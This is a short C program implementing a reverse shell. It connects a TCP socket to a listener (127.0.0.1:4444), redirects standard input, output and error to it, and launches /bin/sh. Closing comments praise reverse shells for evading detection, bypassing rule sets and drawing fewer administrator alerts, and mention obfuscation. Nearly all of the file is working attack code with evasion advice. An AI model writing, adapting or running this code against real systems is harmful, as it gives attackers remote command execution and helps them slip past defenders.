#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>


int main () {

	const char* ip = "127.0.0.1";	
	struct sockaddr_in addr;


	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

	for (int i = 0; i < 3;i++) {

		dup2(sockfd, i);
	}

	execve("/bin/sh", NULL, NULL);

	return 0;

}


// Reverse shells have multiple advantages to bind shells, particularly with evading detection and bypassing certain rule sets. 
// Plus, having a port listening on a host that is not normal will, for the most part, trigger more alerts to system/network administrators.
// Whereas a reverse shell will just show up as a connection to an outside IP address,which will get caught less, especially with certain obfuscation techniques.
